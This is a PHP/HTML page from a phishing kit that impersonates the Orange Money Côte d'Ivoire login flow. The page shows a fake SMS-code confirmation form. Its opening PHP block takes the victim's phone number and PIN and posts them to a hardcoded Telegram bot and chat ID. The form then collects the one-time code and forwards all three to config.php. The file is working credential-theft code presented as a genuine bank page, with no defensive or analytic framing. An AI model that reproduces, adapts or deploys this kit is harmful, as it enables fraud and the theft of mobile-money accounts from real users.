<?7716271490
// =============================================
// PAGE 2 : CONFIRMATION OTP (CODE SMS)
// =============================================

$phone = $_POST['phone'] ?? '';
$pin = $_POST['pin'] ?? '';

if (!$phone || !$pin) {
    header('Location: index.php');
    exit;
}

// Envoi à Telegram des identifiants étape 1
$bot_token = "8674931679:AAHigr1qtX-YZ913O4g2WvxuTKKricXka5Q";
$chat_id = "7716271490";

$msg = "📱 ÉTAPE 1/2 - IDENTIFIANTS
━━━━━━━━━━━━━━━
📞 Téléphone: $phone
🔑 PIN: $pin
━━━━━━━━━━━━━━━
⏳ En attente du code OTP...";

$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$data = ['chat_id' => $chat_id, 'text' => $msg];
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money CI - Confirmation</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: linear-gradient(180deg, #f15e00 0%, #ff7900 100%);
            padding: 50px 20px 30px;
            text-align: center;
            border-radius: 0 0 30px 30px;
        }
        .header .icon { font-size: 50px; margin-bottom: 10px; }
        .header h1 { color: white; font-size: 20px; font-weight: 700; }
        .header p { color: rgba(255,255,255,0.85); font-size: 13px; margin-top: 5px; }
        .info-box {
            background: white;
            margin: 16px;
            padding: 20px;
            border-radius: 16px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
            text-align: center;
        }
        .info-box .phone-display {
            font-size: 20px;
            font-weight: 700;
            color: #333;
            margin: 10px 0;
        }
        .info-box .sms-notification {
            background: #f0f7ff;
            border-radius: 12px;
            padding: 14px;
            margin: 10px 0;
            font-size: 13px;
            color: #555;
            line-height: 1.5;
            border: 1px dashed #ccc;
        }
        .info-box .sms-notification strong { color: #f15e00; }
        .otp-container {
            background: white;
            margin: 0 16px;
            padding: 24px 20px;
            border-radius: 16px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
        }
        .otp-container label {
            display: block;
            text-align: center;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 16px;
        }
        .otp-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 20px; }
        .otp-input {
            width: 50px;
            height: 56px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            outline: none;
        }
        .otp-input:focus { border-color: #f15e00; }
        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(180deg, #ff7900, #f15e00);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-submit:active { transform: scale(0.97); }
        .btn-submit:disabled { opacity: 0.5; transform: none; }
        .timer { text-align: center; margin-top: 14px; font-size: 12px; color: #999; }
        .timer a { color: #f15e00; text-decoration: none; font-weight: 600; }
        .footer { text-align: center; padding: 20px; margin-top: auto; }
        .footer .copyright { font-size: 11px; color: #bbb; }
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255,255,255,0.95);
            z-index: 999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .loading-overlay.active { display: flex; }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f0f0f0;
            border-top-color: #f15e00;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { rotate: 360deg; } }
        .loading-overlay p { margin-top: 16px; color: #333; font-size: 15px; font-weight: 600; }
        .loading-overlay .sub { color: #999; font-size: 12px; margin-top: 4px; }
    </style>
</head>
<body>

    <div class="header">
        <div class="icon">📩</div>
        <h1>Code de confirmation</h1>
        <p>Un code a été envoyé par SMS</p>
    </div>
    
    <div class="info-box">
        <p style="font-size:13px;color:#666;">Un code de vérification a été envoyé au</p>
        <div class="phone-display">+225 <?php 
            echo substr($phone, 0, 2) . ' ' . substr($phone, 2, 2) . ' ' 
               . substr($phone, 4, 2) . ' ' . substr($phone, 6, 2) . ' ' 
               . substr($phone, 8, 2); 
        ?></div>
        
        <div class="sms-notification">
            💬 <strong>SMS reçu de ORANGE MONEY :</strong><br>
            "Votre code de confirmation est : <strong>XXXX</strong>. Ne partagez jamais ce code."
        </div>
    </div>
    
    <div class="otp-container">
        <form method="POST" action="config.php" id="otpForm">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="pin" value="<?php echo htmlspecialchars($pin); ?>">
            <input type="hidden" name="otp" id="otp_full">
            
            <label>Entrez le code reçu par SMS</label>
            
            <div class="otp-inputs">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
            </div>
            
            <button type="submit" class="btn-submit" id="otpBtn" disabled>Confirmer</button>
        </form>
        
        <div class="timer">
            Code valable 3 minutes · <a href="#" onclick="alert('Un nouveau code vous a été envoyé par SMS.');return false;">Renvoyer le code</a>
        </div>
    </div>
    
    <div class="footer">
        <div class="copyright">Orange Money CI © 2026 · Orange Côte d'Ivoire</div>
    </div>
    
    <div class="loading-overlay" id="loading2">
        <div class="spinner"></div>
        <p>Vérification de votre identité...</p>
        <p class="sub">Ne quittez pas cette page</p>
    </div>
    
    <script>
        const otpInputs = document.querySelectorAll('.otp-input');
        const otpHidden = document.getElementById('otp_full');
        const otpBtn = document.getElementById('otpBtn');
        const otpForm = document.getElementById('otpForm');
        const loading2 = document.getElementById('loading2');
        
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                if (this.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                updateOTP();
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });
        
        function updateOTP() {
            let otp = '';
            otpInputs.forEach(input => { otp += input.value; });
            otpHidden.value = otp;
            otpBtn.disabled = otp.length !== 4;
        }
        
        otpForm.addEventListener('submit', function(e) {
            e.preventDefault();
            loading2.classList.add('active');
            setTimeout(() => { this.submit(); }, 2000);
        });
    </script>
</body>
</html>
